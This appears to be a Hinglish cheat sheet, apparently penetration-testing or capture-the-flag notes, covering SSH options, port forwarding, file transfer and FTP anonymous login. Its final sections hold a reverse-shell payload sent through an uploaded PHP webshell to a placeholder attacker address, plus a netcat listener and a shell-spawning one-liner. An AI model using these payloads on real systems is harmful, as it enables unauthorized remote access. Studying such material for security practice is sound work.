# SSH, File Transfer & Remote Shells

## 1. SSH Essentials

```bash
ssh -p 2222 mark@10.49.136.76
```
Use case: Jab server ne default port 22 ki bajaye custom port (e.g. 2222) set ki ho.

```bash
ssh -i ~/.ssh/custom_key mark@10.49.136.76
```
Use case: Jab login ke liye specific private key chahiye ho.

```bash
ssh -J bastion.example.com mark@internal-server
```
Use case: Internal server direct accessible nahi — pehle approved jump/bastion host se connect karo.

```bash
ssh -L 8080:localhost:80 mark@10.49.136.76
```
Use case: **Local port forwarding** — remote server ke port 80 par chal rahi website ko apne laptop ke port 8080 se access karo.

```bash
ssh -D 9050 mark@10.49.136.76
```
Use case: **Dynamic forwarding (SOCKS proxy)** — port 9050 par SOCKS proxy banta hai, multiple destinations tak traffic route karne ke liye (`-L` ek fixed destination karta hai, `-D` dynamic).

```bash
ssh mark@10.49.136.76 "cat /etc/passwd"
```
Use case: Bina interactive shell khole, ek hi command remote machine par chalana.

---

## 2. File Transfer over SSH

```bash
# Remote → Local
scp mark@10.49.136.76:/home/mark/archive.tar.gz ~/

# Local → Remote
scp backup.tar.bz2 mark@10.49.136.76:/home/mark/

# Large folders sync (sirf changed data transfer karta hai)
rsync -avz -e ssh /local/directory/ mark@10.49.136.76:/remote/directory/
```

---

## 3. FTP

```bash
ftp TARGET
# phir try karo: username = anonymous
```
Use case: Port 21 open mile to pehle anonymous access check karo.

### FTP ke Alternatives (faster/more reliable)
```bash
# curl se directory listing (passive mode handle karta hai)
curl --ftp-pasv -u "USERNAME:PASSWORD" ftp://10.48.189.116:21/

# wget se pura directory recursively download
wget -r --ftp-user="USERNAME" --ftp-password="PASSWORD" ftp://10.48.189.116:21/
```
Use case: Jab FTP ka interactive shell broken/unreliable ho, curl/wget zyada stable rehte hain.

---

## 4. Reverse Shell

```bash
# Attacker machine par listener
nc -lvnp 4444
```
```bash
# Victim/target par (web command injection ke through)
curl "http://10.49.129.247/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/CONNECTION_IP/4444+0>%261'"
```
Use case: Webshell ke zariye target machine se attacker machine ko wapis connection bana ke interactive shell lena.

---

## 5. Interactive TTY Upgrade
```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Use case: Reverse shell milne ke baad woh usually "dumb" hota hai (no tab-complete, Ctrl+C se crash) — isse full interactive shell mil jata hai.
